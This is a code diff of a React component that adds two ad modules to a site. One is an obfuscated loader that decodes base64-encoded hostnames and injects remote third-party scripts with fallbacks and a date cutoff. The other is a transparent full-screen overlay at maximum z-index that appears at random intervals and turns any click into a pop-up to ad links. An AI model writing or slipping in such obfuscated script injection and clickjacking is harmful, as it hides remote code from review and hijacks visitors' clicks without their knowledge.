@@ -1,45 +1,125 @@
-import { useEffect } from "react";
-
-import { conf } from "@/utils/setup/config";
+import { useEffect, useState } from "react";
 
 /**
- * PopAds integration component
- * Handles pop-under ads on user clicks
+ * Ad component for PopAds scripts
  */
 export function PopAds() {
-  const apiKey = conf().POPADS_API_KEY;
+  useEffect(() => {
+    // Inject the ad script
+    try {
+      /* eslint-disable */
+      (function () {
+        const w = window as any;
+        const p = "d4430464c8b1fa33b23096b133489163";
+        const n = [
+          ["siteId", 340 - 835 + 294 + 5259222],
+          ["minBid", 0],
+          ["popundersPerIP", "0"],
+          ["delayBetween", 0],
+          ["default", false],
+          ["defaultPerDay", 10], // Increased from 0 to 10
+          ["topmostLayer", false],
+        ];
+        const s = [
+          "d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL3RwbGF5bHlmZS1qcy1zZGsubWluLmNzcw==",
+          "ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvT0VqTy90c2FtbXkubWluLmpz",
+          "d3d3LnpkY3B2aG9kbS5jb20vZXBsYXlseWZlLWpzLXNkay5taW4uY3Nz",
+          "d3d3Lmxqbnpxd2Z1anp2ay5jb20vVS9sc2FtbXkubWluLmpz",
+        ];
+        let j = -1;
+        let c: HTMLScriptElement;
+        let r: NodeJS.Timeout;
+
+        const q = function () {
+          clearTimeout(r);
+          j++;
+          if (s[j] && !(new Date().getTime() > 1790887377000 && j > 1)) {
+            c = w.document.createElement("script");
+            c.type = "text/javascript";
+            c.async = true;
+            const u = w.document.getElementsByTagName("script")[0];
+            c.src = `https://${atob(s[j])}`;
+            c.crossOrigin = "anonymous";
+            c.onerror = q;
+            c.onload = function () {
+              clearTimeout(r);
+              // eslint-disable-next-line @typescript-eslint/no-unused-expressions
+              if (!w[p.slice(0, 16) + p.slice(0, 16)]) {
+                q();
+              }
+            };
+            r = setTimeout(q, 5000);
+            if (u && u.parentNode) {
+              u.parentNode.insertBefore(c, u);
+            }
+          }
+        };
+        if (!w[p]) {
+          try {
+            Object.freeze((w[p] = n));
+          } catch (e) {
+            console.error(e);
+          }
+          q();
+        }
+      })();
+      /* eslint-enable */
+    } catch (err) {
+      console.error("Ad script error:", err);
+    }
+  }, []);
+
+  return null;
+}
+
+/**
+ * Ad component for Adsterra Direct Links with custom overlay
+ */
+export function AdsterraAds() {
+  const [showOverlay, setShowOverlay] = useState(false);
+
+  // Adsterra Direct Links
+  const links = [
+    "https://eventabsorbedrichard.com/cd3ase90?key=fb127ad392630b4c9324b826fdfcf4b0", // smark link / direct-link-2566853
+    "https://eventabsorbedrichard.com/vtx2rzmcq?key=d28afa6bfe284f0fcc8bce0de6d31c80", // vidninja.pro ad tags Smartlink_1
+  ];
 
   useEffect(() => {
-    // Skip if no API key configured or in development
-    if (!apiKey || process.env.NODE_ENV === "development") {
-      return;
+    if (!showOverlay) {
+      // Random interval between 15s and 60s
+      const time = Math.random() * (60000 - 15000) + 15000;
+      const timer = setTimeout(() => {
+        setShowOverlay(true);
+      }, time);
+
+      return () => clearTimeout(timer);
     }
+  }, [showOverlay]);
 
-    // Check if script already loaded
-    if (document.querySelector(`script[src*="popads.net"]`)) {
-      return;
-    }
+  const handleInteraction = () => {
+    // Pick a random link
+    const link = links[Math.floor(Math.random() * links.length)];
+    window.open(link, "_blank");
+    setShowOverlay(false);
+  };
 
-    // Load PopAds script
-    const script = document.createElement("script");
-    script.type = "text/javascript";
-    script.async = true;
-    script.src = `//www.popads.net/pop.js`;
-    script.setAttribute("data-admpid", apiKey);
+  if (!showOverlay) return null;
 
-    document.head.appendChild(script);
-
-    return () => {
-      // Cleanup script on unmount
-      const existingScript = document.querySelector(
-        `script[src*="popads.net"]`,
-      );
-      if (existingScript) {
-        existingScript.remove();
-      }
-    };
-  }, [apiKey]);
-
-  // This is an invisible component
-  return null;
+  return (
+    <div
+      onClick={handleInteraction}
+      onMouseDown={handleInteraction}
+      role="presentation"
+      style={{
+        position: "fixed",
+        top: 0,
+        left: 0,
+        width: "100vw",
+        height: "100vh",
+        zIndex: 2147483647, // Max z-index
+        opacity: 0,
+        cursor: "default",
+      }}
+    />
+  );
 }
